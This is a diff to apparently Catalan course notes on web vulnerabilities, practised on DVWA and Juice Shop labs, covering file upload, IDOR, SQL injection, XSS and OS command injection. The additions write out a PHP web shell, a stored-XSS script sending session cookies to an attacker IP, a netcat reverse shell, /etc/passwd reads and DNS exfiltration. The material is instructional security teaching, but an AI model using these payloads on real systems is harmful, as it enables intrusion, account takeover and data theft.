@@ -219,7 +219,10 @@
       </section>         
       <section id="vuln">
         <h1>Principals Vulnerabilitats Web i la seua explotació</h1>
-        <p>Existteixen llocs on trovar maquines vulnerables, i algunes es poden instal·lar directament en kali linux</p>
+         <img src="imgs/dvwa-logo-500x500.png" alt="dvwa" width="18%" class="imatge-dreta">   
+         <img src="imgs/juiceshop.png" alt="juice" width="12%" class="imatge-dreta">   
+        <p>Existeixen llocs on trovar maquines vulnerables, i algunes es poden instal·lar directament en kali linux</p>
+        <p>Per començar, les més utilitzades son "dvwa" i "juice-shop"</p>
         <li>apt install dvwa </li>
         <pre><code># dvwa-start 
           # dvwa-stop    </code></pre>
@@ -234,6 +237,8 @@
         per inspeccionar i modificar el contingut, i poder així fer els atacs.
         </p>
         <h4>Les dos mes conegudes</h4>
+        <img src="imgs/Burpsuite-logo.png" alt="burp" width="18%" class="imatge-dreta">   
+        <img src="imgs/zap_dvwa2.png" alt="zap" width="18%" class="imatge-dreta">   
         <ul>
           <li>Burp Suite</li>
           <li>OWASP ZAP</li>
@@ -260,7 +265,7 @@
 
         <p>En la màquina DVWA, es proposa la URL ..</p>
         <code>/dvwa/vulnerabilities/fi/?page=file1.php</code>
-        <h3>Execució remota de codi (RCE) mitjantçant  <em>log poisoning</em></h3>
+        <h3>Execució remota de codi (RCE) mitjantçant  <em>log poisoning + LFI</em></h3>
         <p>Per conseguir una execució remota de codi, es necessari trovar la forma de escriure en algun fitxer, inserir codi en ell, i després 
           visualitzar el fitxer amb LFI. Una tècnica per fer això és el <em>log poisoning</em> o enverinament de logs.      </p>
          <li>Primer. Tindre accés mitjantçant LFI a algun fitxer de <em>log</em></li> 
@@ -329,17 +334,283 @@
             10.0.10.50/dvwa/vulnerabilities/fi/?page=http://10.0.10.40/reverse.txt
           </code></pre>
           
-<!--   
+   
         <hr><h2>File upload vulnerabilities</h2>
-        <h2>Acces control vulnerabilities</h2>
+          <p>Les vulnerabilitats de càrrega d'arxius (o file upload vulnerabilities) són defectes de seguretat en aplicacions web 
+            que permeten a un atacant pujar arxius maliciosos a un servidor. Si l'aplicació no valida, saneja o processa correctament
+             l'arxiu pujat, l'atacant pot aprofitar-ho per a dur a terme una gran varietat d'atacs, sent l'execució de codi remot (RCE) el més perillós.</p>
+         <p>Si el codi de l'aplicació confia massa en l'entrada de l'usuari i no valida aspectes crucials com el tipus d'arxiu, el contingut
+           o el nom de l'arxiu, un atacant pot pujar un fitxer que no hauria de ser acceptat.</p>
+        <ul>
+          Alguns dels problemes que poden causar estes vulnerabilitats
+          <li>Atacs del costat del server (php,jsp, asp ..)</li>
+          <li>DoS. Denegació amb un fitxer mooolt gran</li>
+          <li>Atacs del costat del client. XSS, defacement, phishing</li>
+          <li>Disparar fallos en altres sistemes (explotar fallos en llibreries)</li>
+          <li>Altres. (pujar malware, .. ) </li>
+        </ul>
+        <p>en dvwa es pot practicar ...</p>
+        <p>hi ha un formulari per pujar imatges, però es pujarà un fitxer .php que conte codi maliciós i després s'executarà</p>
+        <pre><code> &lt; Nom del fitxer 'shell.php'
+          ?php system($_GET['cmd']);?></code></pre>
+        <p>Es puja el fitxer amb el botò de pujar imatges</p>
+        <p>S'executa amb:  <code>10.0.10.99/dvwa/hackable/uploads/shell.php?cmd=id</code></p>
+        <p>Compte amb:
+          <code>"10.0.10.99/dvwa/hackable/uploads/shell.php?cmd=uname -a"</code> , perque no funciona degut al espai que hi ha entre uname i -a</p>
+          <p>La solució serà usar cyberchef amb la opció  "Encode all special chars" i ens calcula  "uname%20-a" que ja no conté espai i funciona si es
+            posa en la url            </p>
+          <code>"10.0.10.99/dvwa/hackable/uploads/shell.php?cmd=uname%20-a"</code>
+        <li>Altra solució seria utilitzar el mètode POST en compte del GET</li>
+        <li>Una altra seria utilitzar la webshell de   <a href="https://pentestmonkey.net/tools/web-shells/php-reverse-shell">pentestmonkey</a>  </li>
+        <li>I finalment, una altra eina potent es  <a href="https://github.com/epinna/weevely3"> weevely</a>, tutorial en <a href="https://keepcoding.io/blog/webshell-con-weevely/"> keepcoding</a>    </li>
+
+        <hr>  <h2>Acces control vulnerabilities</h2>
+        <p>La vulnerabilitat de seguretat IDOR (Insecure Direct Object Reference) és un tipus de vulnerabilitat de control d'accés 
+           que permet a un atacant accedir a recursos als quals no hauria de tindre permís. Aquesta vulnerabilitat es produeix
+            quan una aplicació utilitza un identificador d'objecte (com un número, un nom d'arxiu o una clau) de forma directa 
+            en un paràmetre URL sense verificar si l'usuari actual té els permisos adequats per a accedir a aquest objecte.</p>
+        <p>IDOR es pot manifestar de moltes maneres</p>
+        <li>https://insecure-website.com/profile?user_id=12345</li>
+        <li>GET /rest/basket/3</li>
+        <li>https://insecure-website.com/files/1234.txt</li>
+        <h4>Atac</h4>
+        <p>La primera i la última es pot manipular la URL directament i provar amb altre numero</p>
+        <p>El GET, cal interceptar la petició amb BurpSuite i canviar el numero, i enviar la petició modificada al server</p>
+
+        <hr>
         <h2>SQLi</h2>
+        <p>La injecció SQL (SQL Injection) és una de les vulnerabilitats de seguretat més antigues i comunes en aplicacions web. Aquest atac es produeix quan un atacant pot inserir
+           codi SQL maliciós en una consulta enviada a la base de dades a través de les dades d'entrada d'una aplicació.</p>
+        <h4>Com funciona una injecció SQL</h4>
+        <p>Normalment, les aplicacions web utilitzen consultes SQL per a interactuar amb la seva base de dades. Per exemple, 
+          per a autenticar un usuari, el codi PHP podria construir una consulta a partir d'un nom d'usuari i una contrasenya que l'usuari ha escrit en un formulari:</p>
+          <code>SELECT * FROM usuaris WHERE nom = 'usuari' AND contrasenya = 'contrasenya';</code>
+        <p>Una aplicació és vulnerable a la injecció SQL si no saneja correctament l'entrada de l'usuari. Un atacant pot aprofitar-se d'això. Si l'atacant introdueix al camp de contrasenya:</p>
+        <code>' OR '1'='1</code>
+        <p>La consulta es convertiria en</p>
+          <code>SELECT * FROM usuaris WHERE nom = 'usuari' AND contrasenya = '' OR '1'='1';</code>
+        <p>Com que la condició '1'='1' sempre és vertadera, la base de dades retornarà totes les files, permetent que l'atacant iniciï sessió sense saber la contrasenya correcta.</p>
+
+        <ul> Esta inserció es pot realitzar de diverses formes
+          <li>Un camp d'un formulari web</li>
+          <li>Una capçalera http</li>
+          <li>Pujada de fitxers al servidor que després seran executats</li>
+          <li>etc..</li>
+        </ul>
+        <h4>Tipus de injeccions SQL</h4>
+        <ul>
+          <li>Injecció clàssica: L'atacant manipula la consulta per a accedir directament a dades sensibles o canviar la lògica de la consulta. L'exemple anterior n'és una mostra.</li>
+          <li>Injecció cega (Blind SQL Injection): Es produeix quan la base de dades no retorna errors o dades directament a l'atacant. En lloc d'això, l'atacant formula preguntes la resposta de les quals es pot inferir a partir del comportament del lloc web. Per exemple, si una consulta retorna un error, la pàgina mostra un missatge, però si l'atacant aconsegueix que la consulta sigui vertadera, la pàgina es carrega normalment.</li>
+          <li>Injecció Out-of-Bond. Si es torna un resultat, es fa per un canal diferent al utilitzat per introduir la injecció. La resposta a la consulta no es presenta en la resposta a la petició http.</li>
+          <li>Injecció a segon ordre: Es produeix quan l'aplicació emmagatzema dades malicioses en una base de dades i les executa més tard en una consulta diferent.</li>
+        </ul>
+        
+        <h4>Tècniques d'injecció</h4>
+        <li>Us de condicions booleanes</li>
+        <li>Us de operador UNION</li>
+        <li>Descobrir l'estructura de la base de dades</li>
+
+        <h3>Blind Injection</h3>
+        <p>La injecció SQL cega (Blind SQL Injection) és una tècnica d'atac on un atacant pot explotar una vulnerabilitat de injecció SQL, 
+          però sense que la base de dades retorne cap error o dada directament a la pàgina web. En lloc de veure el resultat de la consulta 
+          a la pantalla, l'atacant infereix la informació de la base de dades a partir del comportament de l'aplicació.</p>
+          <h4>Com funciona la injecció cega?</h4>
+        <p>A diferència d'una injecció SQL clàssica, on l'atacant pot veure el resultat d'una consulta directament, 
+          en la cega, ha d'utilitzar mètodes indirectes per a "endevinar" la informació. L'atac es basa en fer preguntes 
+          de "sí o no" a la base de dades i observar la resposta de l'aplicació web. Per exemple, una pregunta podria ser: 
+          "La primera lletra de la contrasenya de l'administrador és una 'a'?</p>
+        <ul> Els dos tipus principals d'injecció cega són
+          <li>Injecció basada en booleans: L'atacant envia una consulta que inclou una condició de vertader o fals. Si la condició és vertadera, la pàgina web es comporta d'una manera (per exemple, es carrega normalment). Si és falsa, es comporta d'una altra (per exemple, mostra un missatge d'error o no retorna cap resultat). Analitzant aquests canvis, l'atacant pot anar inferint la informació caràcter per caràcter</li>
+          <li>Injecció basada en temps (Time-based): S'utilitza quan l'aplicació no mostra cap diferència observable en la resposta (ni errors ni canvis de contingut). L'atacant envia una consulta que inclou una funció que fa que la base de dades s'endarrereix a respondre si una condició és vertadera. Per exemple, es pot enviar una consulta amb una condició que, si es compleix, fa que el servidor esperi 10 segons abans de respondre. Si la pàgina triga a carregar, l'atacant sap que la condició era certa. Aquest procés es repeteix per a cada caràcter que es vol extraure.</li>
+        </ul>
+        <h4>Per què és tan perillosa?</h4>
+        <p>Tot i que pot ser un procés més lent i complex que la injecció SQL clàssica, la injecció cega és igualment perillosa.
+           Un atacant pot automatitzar el procés amb eines especialitzades per a:</p>
+        <ul>
+          <li>Extraure bases de dades senceres: Robar noms d'usuaris, contrasenyes, dades de clients i qualsevol altra informació sensible.</li>
+          <li>Aconseguir el control del sistema: En alguns casos, un atacant pot arribar a executar comandes del sistema operatiu si la base de dades té els permisos adequats.</li>
+        </ul>
+        <p>Aquest tipus d'atac és especialment difícil de detectar perquè sovint no deixa cap rastre de dades en la resposta de l'aplicació, 
+          fent que molts desenvolupadors no se n'adonin fins que ja és massa tard. La millor manera de previndre'l és utilitzar consultes 
+          parametritzades per a totes les interaccions amb la base de dades.</p>
+
+         <h3>automatització del descobriment i explotació de injeccions SQL</h3> 
+         <p>Existeixen nombroses eines que permeten automatitzar el procés de detecció i exfiltració de dades
+          en vulnerabilitats de injecció SQL.  Hi ha de lliures, propietaries, especéfiques com a part d'una solució integrada. Entre les més destacades i conegudes estan:    </p>
+          <ul>
+            <li>sqlmap</li>
+            <li>jSQL injection</li>
+            <li>NoSQLMap</li>
+            <li>BBQSQL</li>
+          </ul>
+          <h4>sqlmap</h4>
+          <p>És una eina de codi obert escrita en python i un test de penetració que automatitza el procés de detecció i explotació de vulnerabilitats d'injecció SQL en 
+            aplicacions web i, posteriorment, de presa de control del servidor de la base de dades</p>
+
+          <p>SQLMap ofereix un suport complet per als següents SGBD, cosa que significa que pot explotar vulnerabilitats, enumerar bases de dades, taules i columnes, i extreure dades amb una gran precisió:
+            MySQL i MariaDB, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase, SAP MaxDB, Informix, i moltes més.        </p>
+          <p>A més a més, soporta integració amb <strong>Meterpreter</strong> de <strong>Metasploit</strong></p>
+
+
+          <p>Aquest vídeo tutorial mostra com fer servir SQLMap en un entorn de proves, que és una manera segura de practicar les tècniques d'auditoria
+             <a href="https://www.youtube.com/watch?v=PwFXqUrIpV8">de 12 minuts</a> </p>  
+          
+          <h4>jSQL Injection</h4>
+          <p>És una eina multiplataforma de codi obert escrita en java, relativament fàcil d'utilitzar amb una GUI </p>
+          <p>En les ultimes versions de kali no ve incorporada, però es pot instal·lar fàcilment amb:</p>
+          <code>$ sudo apt update && sudo apt install jsql-injection</code>
+          <p>El lloc web <strong>Vulnweb.com</strong> disposa de varios llocs vulnerables on poder practicar</p>
+
+          <h4>NoSQLMap</h4>
+          <p>NoSQLMap és una eina de codi obert escrita en Python que automatitza la injecció de codi i altres vulnerabilitats
+             en bases de dades NoSQL, especialment en MongoDB i altres bases de dades basades en JSON.</p>
+          <p>Aquesta eina està dissenyada per a auditar la seguretat de les aplicacions que utilitzen bases de dades NoSQL, 
+            ja que les tècniques d'injecció SQL tradicionals no són aplicables. NoSQLMap es va crear per a omplir el buit que 
+            va deixar l'eina SQLMap, ja que aquesta última se centra exclusivament en bases de dades SQL</p>
+          
+          <h4>BBQSQL</h4>
+          <p>BBQSQL és una eina en linea de comandos de codi obert i escrita en python, que explota la injecció SQL cega
+             (Blind SQL Injection) de manera automàtica. A diferència d'eines com SQLMap, que tenen una lògica 
+             complexa per a diferents SGBD i tipus d'injecció, BBQSQL se centra exclusivament en l'explotació de la injecció SQL cega 
+             i, per tant, no està lligada a un sistema gestor de base de dades (SGBD) específic de la mateixa manera que altres eines més generals.</p>
+          <p>Encara que no esta lligada a cap SGBD, ofereix plantilles preconfigurades per alguns SGBD comuns, com: 
+            MySQL, PostgreSQL, Microsoft SQL Server (MSSQL), Oracle Database, SQLite</p>
+
+
         <h2>Cross-Site Scripting XSS</h2>
+        <p>El Cross-Site Scripting (XSS) és una vulnerabilitat de seguretat en aplicacions web que permet a un atacant injectar scripts maliciosos 
+        (generalment JavaScript) en pàgines web visualitzades per altres usuaris. L'atacant pot utilitzar aquests scripts per a robar dades, 
+        segrestar sessions, manipular el contingut del lloc o redirigir usuaris a llocs maliciosos. <br>
+        Aquesta vulnerabilitat apareix quan una aplicació web no valida ni saneja correctament l'entrada de l'usuari abans de mostrar-la a una altra pàgina.</p>
+        <p>XSS pot explotar-se amb múltiples propòsits. Els més comuns..</p>
+        <ul>
+          <li>Fer un "defacement" d'una web</li>
+          <li>Capturar Cookies de sessió d'un usuari =>  <strong>(Session Hijacking  o  Cookie Hijacking) </strong></li>
+        </ul>
+        <h3>Web defacement</h3>
+        <p>El Web Defacement és un tipus d'atac a un lloc web on un atacant altera o substitueix la pàgina principal o 
+          una altra pàgina del lloc per un contingut propi. Aquest contingut maliciós pot ser un missatge polític, 
+          una firma de l'atacant, imatges, música o qualsevol altra cosa que l'atacant vulgui mostrar.</p>
+
+        <h3>Tipus de XSS</h3>
+        <p>Existeixen tres tipus principals d'atacs XSS, cadascun amb un mecanisme d'explotació diferent:</p>
+        <ol>
+          <li><strong>XSS reflectit (Reflected XSS)</strong></li>
+          Aquest tipus d'atac es produeix quan un script maliciós s'envia a través d'una petició HTTP i es "reflecteix" directament en la resposta del servidor.
+          <li><strong>XSS emmagatzemat (Stored XSS)</strong></li>
+          És el tipus de XSS més perillós. L'atacant injecta un script que s'emmagatzema de manera persistent en la base de dades del servidor.
+          <li><strong>XSS basat en DOM (DOM-based XSS)</strong></li>
+          En aquest cas, la vulnerabilitat es troba al costat del client, al codi JavaScript de la pàgina, no al servidor.
+        </ol>
+        <h4>XSS reflectit (Reflected XSS)</h4>
+        <img src="imgs/xss-r-attack.png" alt="r-xss" width="70%" class="imatge-dreta" >   
+        <p>Com funciona? L'atacant crea un enllaç maliciós amb el codi maliciós injectat. Normalment es fa arribar a la victima amb Enginyeria Social.
+          Quan un usuari(victima) fa clic a l'enllaç, la petició 
+          s'envia al servidor, que la processa i inclou el codi a la resposta HTML. El navegador de l'usuari executa el codi maliciós
+           com si fos una part legítima de la pàgina. Carrega i mostra la pàgina legítima i a més a més executa el codi maliciós</p>
+        <p>Exemple: Un atacant podria enviar un enllaç com 
+        <code>  https://exemple.com/cerca?q=&lt;script>alert('XSS');&lt;/script>. </code>
+         Si el servidor reflecteix el paràmetre <strong><code>q</code></strong> sense sanejar-lo, l'script s'executarà al navegador de l'usuari.</p>
+         <p>També se sol utilitzar la funcio <code>alert(1)</code> per testar XSS</p>
+            <h5>Evasió</h5>
+            <p>Per evitar ser detectat per les possibles funcions que netegen el codi, es poden utilitzar algunes tècniques..</p>
+            <li>En BurpSuit hi ha una opcion per Codificar en hexadecimal (encode as ..url) </li>
+            <li>També es pot barrejar majúscules <code>=&lt;sCript>alert(1);&lt;/sCript></code> </li>
+            <li>Usar altres etiquetes html combinades amb events.. <code> &lt;img src=1 onerror=alert(1)>  </code></li>
+        
+
+        <h4>XSS emmagatzemat (Stored XSS)</h4>
+        <p>Com funciona? L'atacant introdueix el codi maliciós en un camp d'entrada que es desa al servidor, com un comentari 
+          en un blog, un missatge en un fòrum o el nom d'usuari d'un perfil. Quan qualsevol altre usuari visita la pàgina que
+          mostra aquest contingut, el codi s'executa automàticament al seu navegador.</p>
+        <p>Exemple: Un atacant escriu un comentari en un blog que conté un script maliciós. Quan un altre usuari llegeix el 
+          comentari, el script s'executa i roba la seva cookie de sessió, donant a l'atacant accés al seu compte.</p>
+            <h5>Robatori de sessions (session hijacking)</h5>
+            <p>Per practicar este apartat es pot utilitzar la secció XXS(Stored) de la DVWA.</p>
+            <p>En el formulari posem: <br>
+            name: cookie! <br>
+            message:  <code> &lt;script> new Image().src="http;//10.0.10.40:8080?+document.cookie &lt;/script> </code></p>
+            <p>10.0.10.40 es la ip de l'atacant.</p>
+            <p>Desde l'atacant, s'obri un netcat que escolta  <code>nc -lnvp 8080</code></p>
+            <p>Esperem a que algú, admin, entre en la pàgina, i en el netcat obert es rep la cookie (PHPSESSID)</p>
+            <p>En el nostre navegador (atacant) , canviem la nostra cookie per la de la victima, i ja som "admin"</p>
+            <p>....</p>
+            <br><br>
+            <p>Hi ha pàgines on trobar payloads que es poden aplicar en cas de vulnerabilitat</p>
+            <p>Visita <a href="https://swisskyrepo.github.io/PayloadsAllTheThings/XSS%20Injection/">PayloadsAllTheThings</a>. En esta web s'oferix un
+            llistat extens de posibilitats i combinacions</p>
+
+
+        <h4>XSS basat en DOM (DOM-based XSS)</h4>
+        <p>Quan un navegador carrega una pàgina web, construeix una estructura de dades del DOM basant-se en el codi HTML del document. El navegador no mostra el codi HTML directament, sinó la representació visual del DOM. <br>
+          Cada element del document, incloent-hi el text i els atributs, es converteix en un objecte que el DOM organitza en una jerarquia d'arbre.</p>
+        <p>Aquesta estructura en forma d'arbre facilita la navegació per la pàgina. L'element arrel és document, que conté la resta de nodes.
+           Per exemple, el node &lt;html> és el fill de document, i el &lt;head> i el &lt;body> són els fills de &lt;html>. 
+            Cada node, alhora, pot tenir fills, germans i un pare, cosa que permet als desenvolupadors accedir i manipular qualsevol part de la pàgina.</p>
+        <p>A banda dels nodes HTML, el DOM també emmagatzema les propietats de la pàgina, com les cookies, la URL de la que ve la pàgina (referer), la URL actual, etc..</p>    
+        <p>Per més informació es recomana consultar la pàgina de Mozilla Developement Network  <a href="https://developer.mozilla.org/es/docs/Web/API/Document_Object_Model">DOM</a></p>
+
+        <p>Com funciona? El navegador executa un script maliciós sense que la pàgina hagi estat alterada. L'atac es basa 
+          en la manipulació de l'estructura del DOM (Document Object Model) de la pàgina a través de dades que l'usuari 
+          ha inserit, com ara un fragment de l'URL.</p>
+        <p>Exemple: Una pàgina utilitza JavaScript per a llegir un paràmetre de l'URL i inserir-lo directament al HTML sense comprovar-ne 
+          el contingut. Un atacant pot crear un enllaç que injecti un script que manipuli el DOM de la pàgina.</p>
+
+        <h3>Practica</h3>  
+        <p>Per practicar l'XSS es poden utilitzar algun recursos interessants</p>
+        <li><a href="https://xss-game.appspot.com/"> XSS Game</a>  </li>
+        <li><a href="https://xss-quiz.int21h.jp/">XSS Challenges</a> 19 reptes secuencials..</li>
+
+        <p>I altres....</p>
+        <a href="https://xss.challenge.training.hacq.me/">XSS Challenge by y0n3uchy</a>  -.-.-
+        <a href="https://www.intigriti.com/researchers/hackademy/xss-challenges">XSS Challenges by intigriti</a>
+
+        <h3>Eina BeEF</h3>
+         <img src="imgs/beef-logo.png" alt="r-xss" width="10%" class="imatge-esquerra" >   
+        <p>BeEF (Browser Exploitation Framework) és una eina de codi obert dissenyada per a auditar
+           la seguretat dels navegadors web. A diferència d'altres eines que s'enfoquen en el servidor, BeEF se centra en el client
+            (el navegador de l'usuari). L'eina "injecta" codi JavaScript maliciós a un navegador vulnerable i l'utilitza per a controlar-lo de forma remota.</p>
+
+
+
+<!--                
         <h2>Criss-Site Request Forgery CSRF</h2>
         <h2>Server-Side Request Forgery SSRF</h2>
         <h2>Server-Side Template Injection  SSTI</h2>
         <h2>XML External Entity (XXE) Injection</h2>
-        <h2>OS Command Injection</h2>
 -->
+
+        <hr>   <h2>OS Command Injection</h2>
+        <p>La injecció de comandes del sistema operatiu (OS Command Injection) és una vulnerabilitat de seguretat que 
+          permet a un atacant executar comandes del sistema operatiu en un servidor a través d'una aplicació web. 
+          Aquesta vulnerabilitat es produeix quan una aplicació web utilitza l'entrada de l'usuari per a construir i executar
+           una comanda del sistema sense validar-la o sanejar-la correctament.</p>
+        <h4>Com funciona?</h4>
+        <p>Una aplicació web vulnerable sol tindre una funcionalitat que executa una comanda a nivell del sistema operatiu per a
+           realitzar una tasca. Per exemple, una pàgina que permet als usuaris fer un ping a una adreça IP podria usar una comanda com:</p>
+          <pre><code>ping $_GET['ip']</code></pre>
+        <p>Si l'usuari introdueix una adreça IP vàlida, la comanda s'executa correctament. No obstant això, un atacant pot afegir metacaràcters
+           com ";", "|" o "&" (depenent del sistema operatiu) per a encadenar una nova comanda.
+         <br> Per exemple, si l'atacant introdueix el següent valor a la URL:</p>
+        <pre><code>localhost; ls -la</code></pre>
+        <p>La comanda final que s'executaria al servidor seria:</p>
+        <pre><code>ping localhost; ls -la</code></pre>
+        <p>Això faria que el servidor no només executés la comanda ping, sinó que també executés la comanda ls -la, que llista 
+          els arxius i directoris del sistema. Aquesta informació podria ser útil per a un atacant per a planejar atacs futurs.</p>
+        <p>Si en compte de posar un <code>ls</code> l'atacant posa un <code>nc</code> (netcat) per obrir una shell inversa ...</p>
+        <pre><code>        ; tail /etc/passwd
+        ; nc -e /bin/sh 10.0.10.40 4444
+        </code></pre>
+
+        <h4>Blind command injection</h4>
+        <p>De vegades, els resultats no es mostren en la pagina web resultant, i cal recorrer a tèniques més sofisticades per poder
+          exfiltrar les dades.    </p>
+          <li>directoris amb permisos d'escritura</li>
+          ; tail /etc/passwd > /var/www/html/dvwa/hackable/uploads/usuarios.txt <br>
+          i despres usar LFI amb  10.0.10.50/dvwa/hackable/uploads/usuarios.txt
+          <li>tècniques Out-of-Band</li>
+        dig @IP_DNS_ATACANT 'whoami'.dominio.com &
+
       </section>         
       <section id="labs">
         <h1>Laboratoris</h1>
